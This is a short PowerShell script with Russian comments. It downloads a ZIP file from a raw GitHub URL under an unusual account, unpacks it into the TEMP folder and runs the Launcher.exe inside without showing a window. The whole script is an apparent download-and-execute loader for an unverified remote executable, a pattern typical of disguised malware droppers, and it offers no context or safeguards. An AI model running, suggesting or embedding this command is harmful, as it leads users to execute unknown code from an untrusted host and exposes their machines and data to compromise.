$zipUrl = "https://raw.githubusercontent.com/v25888656-maker/installer/main/Launcher.zip"
$zipPath = "$env:TEMP\Launcher.zip"
$exePath = "$env:TEMP\Launcher.exe"

# Скачиваем ZIP
irm -Uri $zipUrl -OutFile $zipPath

# Распаковываем
Expand-Archive -Path $zipPath -DestinationPath $env:TEMP -Force

# Запускаем
Start-Process -FilePath $exePath -NoNewWindow
